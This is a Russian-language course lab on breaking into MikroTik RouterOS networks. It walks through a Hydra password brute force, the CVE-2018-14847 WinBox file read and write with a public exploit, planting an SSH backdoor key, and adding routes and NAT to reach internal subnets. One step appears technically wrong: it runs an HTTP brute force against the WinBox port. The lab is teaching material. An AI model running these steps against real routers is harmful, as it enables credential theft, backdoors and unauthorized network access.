
## Цель работы

Освоить методы несанкционированного доступа к защищённым сетевым сегментам путём эксплуатации уязвимостей и слабых настроек в оборудовании MikroTik RouterOS.

---

## Задачи работы

- Провести подбор пароля администратора к внешнему маршрутизатору MikroTik (192.168.0.116) с использованием утилиты `Hydra`.
    
- Эксплуатировать уязвимость CVE-2018-14847 на внутреннем маршрутизаторе MikroTik (10.10.1.2) для чтения конфиденциальных файлов и записи вредоносных данных.
    
- Перенастроить таблицу маршрутизации на скомпрометированном MikroTik для обеспечения доступа к подсетям Security (10.10.3.0/24) и Internal Servers (10.10.5.0/24).

---

## Теоретическая часть  
### 1. Уязвимости сетевой периметрии  
**Сетевое оборудование** (маршрутизаторы, коммутаторы) часто становится мишенью атак из-за:  
- Использования стандартных учётных данных (`admin:admin`)  
- Несвоевременного обновления ПО  
- Наличия критических уязвимостей в прошивках  

**MikroTik RouterOS** — популярная ОС для маршрутизаторов, подверженная ряду уязвимостей:  
- **CVE-2018-14847**: Позволяет читать/писать файлы без аутентификации через WinBox (порт 8291).  
- **CVE-2019-3943**: Уязвимость в API (порт 8728) для выполнения команд.  

### 2. Техники атаки  
#### 2.1 Подбор паролей (Brute-forcing)  
**Принцип:** Систематическая проверка комбинаций логин/пароль.  
**Уязвимые протоколы:**  
- FTP (21), SSH (22), Telnet (23)  
- WinBox (8291), WebFig (80/443)  

**Инструменты:**  
- `Hydra`: Параллельный подбор через несколько протоколов.  
- `Medusa`: Альтернатива с поддержкой модулей.  

#### 2.2 Эксплуатация CVE-2018-14847  
**Этапы:**  
1. **Чтение конфигурации:** Получение файла `/flash/rw/store/user.dat` с паролями.  
2. **Запись файлов:** Размещение бэкдора через произвольную запись.  
3. **RCE:** Цепочка: File Write → SSH-ключ → Полный доступ.  

#### 2.3 Манипуляция маршрутами  
**Цель:** Перенаправление трафика в закрытые подсети (Security: `10.10.3.0/24`, Internal: `10.10.5.0/24`).  
**Методы:**  
- Добавление статических маршрутов  
- Изменение политик NAT  
- Настройка VPN-туннелей  

---

## Ход выполнения  

### Шаг 1: Подбор пароля к MikroTik (192.168.0.116)  
**Цель:** Получить доступ через WinBox/SSH.  
1. Сканирование портов:  
```bash  
nmap -p 22,8291 192.168.0.116  
```  
2. Подбор пароля к WinBox (порт 8291):  
```bash  
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.116 -s 8291 -t 64 http-post-form "/:username=^USER^&password=^PASS^:F=invalid"  
```  
3. При успехе: подключение через WinBox с найденными данными.  

### Шаг 2: Эксплуатация CVE-2018-14847 (10.10.1.2)  
**Цель:** Чтение системных файлов и получение RCE.  
1. Скачать эксплойт:  
```bash  
git clone https://github.com/BasuCert/WinboxPoC  
```  
2. Чтение файла с паролями:  
```bash  
python3 winboxPOC.py read 10.10.1.2 /flash/rw/store/user.dat  
```  
3. Расшифровка паролей:  
```bash  
python3 winboxPOC.py decrypt <хэш_из_user.dat>  
```  
4. Запись SSH-ключа:  
```bash  
python3 winboxPOC.py write 10.10.1.2 /id_rsa ./backdoor_key  
```  
5. Доступ по SSH:  
```bash  
ssh -i backdoor_key admin@10.10.1.2  
```  

### Шаг 3: Переконфигурация маршрутов  
**Цель:** Доступ к подсетям `10.10.3.0/24` и `10.10.5.0/24`.  
1. В консоли MikroTik:  
```bash  
/ip route add dst-address=10.10.3.0/24 gateway=10.10.1.1  
/ip route add dst-address=10.10.5.0/24 gateway=10.10.1.1  
```  
2. Проверка доступности:  
```bash  
ping 10.10.3.10  
traceroute to 10.10.5.20  
```  
3. (Опционально) Настройка NAT для проброса портов:  
```bash  
/ip firewall nat add chain=dstnat dst-address=10.10.1.2 action=dst-nat to-addresses=10.10.5.50  
```  

---

## Форма отчёта  
1. **Результаты сканирования портов** (nmap).  
2. **Вывод Hydra** с найденными учётными данными.  
3. **Скриншоты:**  
   - Чтение `user.dat` через эксплойт.  
   - Успешный вход по SSH.  
   - Таблица маршрутов MikroTik.  
4. **Выводы:**  
   - Какие пароли были использованы в системе?  
   - Как уязвимость CVE-2018-14847 упрощает компрометацию?  
   - Риски неправильной настройки маршрутизации.  

---

## Вопросы для самоконтроля  
1. Почему MikroTik часто подвергается атакам?  
2. Как защитить RouterOS от CVE-2018-14847?  
3. Чем опасен статический маршрут в закрытую подсеть?  
4. Альтернативы Hydra для подбора паролей.  
5. Как обнаружить несанкционированные изменения в таблице маршрутизации?  
6. Почему WinBox-порт (8291) критичен для безопасности?  
